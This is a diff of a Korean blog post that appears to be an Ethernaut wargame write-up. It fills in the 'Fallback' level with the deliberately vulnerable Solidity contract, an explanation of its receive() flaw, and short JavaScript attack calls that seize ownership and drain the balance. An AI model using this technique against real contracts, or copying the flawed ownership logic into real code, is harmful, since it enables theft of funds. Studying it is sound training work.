@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Ethernaut 0~40"
-date: 2026-05-27
+date: 2026-06-03
 category: "CTF/Wargame"
 tags: ["Ethereum", "Solidity", "Ethernaut", "Smart Contract", "Wargame"]
 excerpt: "Ethernaut 문제 풀이 미완"
@@ -70,7 +70,10 @@ await contract.authenticate(password);
 
 ### 문제 요약
 
-작성 예정.
+이 레벨을 클리어하려면 다음 두 가지 조건을 모두 만족해야 한다.
+
+- 해당 컨트랙트의 소유권 획득
+- 컨트랙트의 잔액을 0으로 줄이기
 
 ### 핵심
 
@@ -78,19 +81,84 @@ await contract.authenticate(password);
 - 소액 기여 조건
 - 컨트랙트 소유권 변경
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Fallback {
+    mapping(address => uint256) public contributions;
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+        contributions[msg.sender] = 1000 * (1 ether);
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function contribute() public payable {
+        require(msg.value < 0.001 ether);
+        contributions[msg.sender] += msg.value;
+        if (contributions[msg.sender] > contributions[owner]) {
+            owner = msg.sender;
+        }
+    }
+
+    function getContribution() public view returns (uint256) {
+        return contributions[msg.sender];
+    }
+
+    function withdraw() public onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        require(msg.value > 0 && contributions[msg.sender] > 0);
+        owner = msg.sender;
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+핵심은 `receive()`다.
+
+```solidity
+receive() external payable {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender;
+}
+```
+
+`receive()`는 ETH를 직접 보낼 때 실행된다. 조건은 두 개다.
+
+1. `msg.value > 0`
+2. `contributions[msg.sender] > 0`
+
+그래서 먼저 `contribute()`로 기여 기록을 만든다. 그 다음 컨트랙트에 ETH를 직접 보내면 `owner`가 내 주소로 바뀐다. 마지막으로 `withdraw()`를 호출해 잔액을 비운다.
 
 ### 공격 코드
 
 ```javascript
-// 작성 예정
+await contract.contribute({ value: 1 })
+
+await sendTransaction({ to: contract.address, value: 1 })
+
+await contract.withdraw()
 ```
+
+- `contribute({ value: 1 })`: 1 wei를 보내 `contributions[player]` 값을 0보다 크게 만든다.
+- `sendTransaction({ to: contract.address, value: 1 })`: 컨트랙트에 ETH를 직접 보내 `receive()`를 실행한다. 이때 `owner`가 내 주소로 바뀐다.
+- `withdraw()`: `owner` 권한으로 컨트랙트 잔액을 출금한다.
 
 ### 정리
 
-작성 예정.
+소액 기여 후 ETH를 직접 전송하면 `receive()`로 소유권을 탈취할 수 있다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Fallout" markdown="1">
